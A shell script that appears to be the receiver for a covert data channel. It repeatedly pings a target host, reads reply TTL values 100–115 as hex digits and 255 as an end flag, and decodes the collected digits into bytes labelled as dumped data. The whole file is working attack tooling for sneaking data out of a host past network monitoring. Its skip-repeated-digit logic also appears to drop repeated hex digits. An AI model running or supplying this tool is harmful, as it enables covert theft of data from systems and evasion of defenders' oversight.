 #!/bin/sh 
payload="";
PingRequest=0;
c=0;
temp="";
while (true)
do
        Time=`date '+%d/%m/%Y %H:%M:%S'`
	((PingRequest++));

	string=`ping $1 -c 1 | grep -e ttl= | awk {'print $6'}`	 
	echo
        string=`echo $string | cut -d'=' -f2`	 
   
        case $string in 
        100)
 tput setaf 2; 
        echo "[$Time]" "Dumped Byte via TTL : 0"
	if (( $temp != 100 )) ;
	then
	payload+="0"
	fi
	;;
        101)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 1"
	if (( $temp != 101 )) ;
	then
	payload+="1"
	fi
	;;
        102)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 2"
	if (( $temp != 102 )) ;
	then
	payload+="2"
	fi	
	;;
        103)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 3"
	if (( $temp != 103 )) ;
	then
	payload+="3"
	fi
	;;
        104)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 4"
	if (( $temp != 104 )) ;
	then
	payload+="4"
	fi
	;;
        105)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 5"
	if (( $temp != 105 )) ;
	then
	payload+="5"
	fi
	;;
        106)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 6"
	if (( $temp != 106 )) ;
	then
	payload+="6"
	fi
	;;
        107)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 7"
	if (( $temp != 107 )) ;
	then
	payload+="7"
	fi
	;;
        108)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 8"
	if (( $temp != 108 )) ;
	then
	payload+="8"
	fi
	;;
        109)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : 9"
	if (( $temp != 109 )) ;
	then
	payload+="9"
	fi
	;;
        110)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : a"
	if (( $temp != 110 )) ;
	then
	payload+="a"
	fi
	;;
        111)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : b"
	if (( $temp != 111 )) ;
	then
	payload+="b"
	fi
	;;
        112)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : c"
	if (( $temp != 112 )) ;
	then
	payload+="c"
	fi
	;;
        113)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : d"
	if (( $temp != 113 )) ;
	then
	payload+="d"
	fi
	;;
        114)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : e"
	if (( $temp != 114 )) ;
	then
	payload+="e"
	fi
	;;
        115)
 tput setaf 2; 
       echo "[$Time]" "Dumped Byte via TTL : f"
	if (( $temp != 115 )) ;
	then
	payload+="f"
	fi
	;;
        255)
        tput setaf 1; 
        echo "[$Time] ," $c ":Dumped Finish Flag 'ttl 255' "        

	((c++));

        if (( $c == 25 )) ;
	then
	break
	fi
	;;
        esac
        
        temp=$string;

 tput setaf 9;
       echo "Ping Requests:" $PingRequest 
       echo "your Payload :"  $payload 
 tput setaf 9; 
       final=`echo $payload | xxd -r -p`
       echo "your Data : " $final
sleep 1;
done

